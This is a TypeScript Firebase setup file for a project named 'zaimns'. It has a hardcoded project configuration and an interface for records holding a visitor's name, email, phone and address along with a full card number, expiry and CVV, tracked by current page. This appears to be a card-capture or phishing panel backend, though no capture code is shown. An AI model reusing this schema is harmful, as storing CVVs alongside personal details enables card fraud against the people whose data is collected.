import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
   apiKey: "AIzaSyB6fMi5ZQZGLG-AWW2l59eexC__TTl1VaQ",
  authDomain: "zaimns.firebaseapp.com",
  databaseURL: "https://zaimns-default-rtdb.firebaseio.com",
  projectId: "zaimns",
  storageBucket: "zaimns.firebasestorage.app",
  messagingSenderId: "573438865337",
  appId: "1:573438865337:web:4302dc325aff0e63fd9068",
  measurementId: "G-4R9XW48TV6",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

